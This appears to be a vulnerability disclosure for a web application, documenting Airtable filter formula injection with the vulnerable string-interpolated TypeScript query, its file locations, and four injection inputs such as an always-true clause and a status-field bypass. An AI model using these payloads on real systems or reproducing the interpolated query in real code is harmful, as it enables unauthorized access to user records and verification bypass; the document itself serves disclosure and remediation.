# Airtable Filter Formula Injection - Proof of Concept

## Vulnerability Overview

The application uses string concatenation to build Airtable filter formulas, making it vulnerable to formula injection attacks. This is similar to SQL injection but targets Airtable's formula syntax.

## Vulnerable Locations

1. `src/pages/api/slack/vouch.ts:16`
2. `src/pages/api/slack/lookup.ts:14-16`  
3. `src/lib/slack.ts:12-14`

## Vulnerable Code Pattern

```typescript
const record = await base("Users")
  .select({ filterByFormula: `{Email} = '${email}'` })
  .firstPage();
```

## Attack Vectors

### 1. Basic Injection - Breaking Out of String Context

**Attack Input:**
```
test@example.com', TRUE()) OR ({Email} = 'victim@example.com
```

**Resulting Formula:**
```
{Email} = 'test@example.com', TRUE()) OR ({Email} = 'victim@example.com'
```

This breaks the filter logic and could potentially return multiple records.

### 2. Always True Injection

**Attack Input:**
```
' OR 1=1 OR '{Email}' = '
```

**Resulting Formula:**
```
{Email} = '' OR 1=1 OR '{Email}' = ''
```

This could return all records in the table.

### 3. Logical Operator Injection

**Attack Input:**
```
test@example.com') OR TRUE() OR ({Email} = 'anything
```

**Resulting Formula:**
```
{Email} = 'test@example.com') OR TRUE() OR ({Email} = 'anything'
```

This uses Airtable's TRUE() function to bypass the email check.

### 4. Field Extraction Attack

**Attack Input:**
```
') OR ({Verification Status} = 'Eligible
```

**Resulting Formula:**
```
{Email} = '') OR ({Verification Status} = 'Eligible'
```

This could retrieve all eligible users regardless of email.

## Testing the Vulnerability

See `test-injection.ts` for automated tests that demonstrate the vulnerability.

## Impact

1. **Unauthorized Data Access**: Attacker can retrieve any user's verification status
2. **Privilege Escalation**: Attacker can mark themselves as verified by manipulating queries
3. **Data Enumeration**: Attacker can list all users in the database
4. **Business Logic Bypass**: Attacker can bypass email validation checks

## Remediation

See `REMEDIATION.md` for secure code examples.
